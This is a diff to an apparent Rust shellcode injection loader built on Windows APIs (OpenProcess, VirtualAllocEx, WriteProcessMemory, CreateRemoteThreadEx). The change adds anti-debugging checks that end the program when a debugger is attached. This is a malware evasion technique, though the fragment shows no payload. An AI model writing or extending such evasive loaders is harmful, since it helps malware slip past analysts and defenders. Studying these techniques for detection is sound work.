@@ -3,10 +3,10 @@ use windows::{
     Win32::{
         System::{
             Memory::{VirtualAllocEx, VirtualProtectEx, VirtualFree, MEM_COMMIT, MEM_RESERVE, MEM_RELEASE, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE},
-            Diagnostics::Debug::WriteProcessMemory, 
+            Diagnostics::Debug::{WriteProcessMemory, IsDebuggerPresent, CheckRemoteDebuggerPresent}, 
             Threading::{CreateRemoteThreadEx, OpenProcess, WaitForSingleObject, PROCESS_ALL_ACCESS, INFINITE},
         },
-        Foundation::CloseHandle,
+        Foundation::{CloseHandle, BOOL},
     },
 };
 use std::{ptr::{self, null_mut, null}, process, mem};
@@ -30,9 +30,21 @@ fn main() {
     let pid = process::id();
 
     unsafe {
+
         println!("[i] Trying to open a Handle for the Process {pid}");
         match OpenProcess(PROCESS_ALL_ACCESS, false, pid) {
             Ok(hprocess) => 'p: {
+
+                let mut debugger_present: BOOL = BOOL(0);
+                
+                if CheckRemoteDebuggerPresent(hprocess, &mut debugger_present as *mut BOOL).is_ok() && debugger_present.as_bool() {
+                    process::exit(-1);
+                }
+
+                if IsDebuggerPresent().as_bool(){
+                    process::exit(-1);
+                }
+
                 let haddr = VirtualAllocEx(
                     hprocess,
                     Some(null_mut()),
